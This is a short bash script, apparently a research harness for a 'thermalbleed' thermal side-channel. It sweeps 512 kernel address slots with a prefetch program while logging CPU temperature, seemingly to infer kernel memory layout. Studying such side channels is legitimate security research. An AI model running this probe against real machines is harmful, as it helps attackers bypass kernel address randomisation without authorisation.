#!/bin/bash

HWMON="/sys/class/hwmon/hwmon1/temp2_input"
CORE_0=0
CORE_N_MINUS_1=11
DIR=thermalbleed
T_N=1000

rm -f $DIR
mkdir $DIR
make page CFLAGS="-O0 -DMILLIS=2 -DN_MEASUREMENTS=$T_N"

BASE=0xffffffff80000000
SLOT=$((2 * 1024 * 1024)) # 2 MiB

for ((i = 0; i < 512; i++)); do
  address=$((BASE + i * SLOT))
  arg=$(printf "0x%x" $address)
  echo "Testing slot $i with address $arg"
  taskset -c $CORE_0 ./out/page_prefetch $arg &
  tPID=$!
  sleep 0.02
  taskset -c $CORE_N_MINUS_1 ./out/temp $HWMON >"$DIR/data$i.txt"
  kill $tPID
  sleep 0.5
done
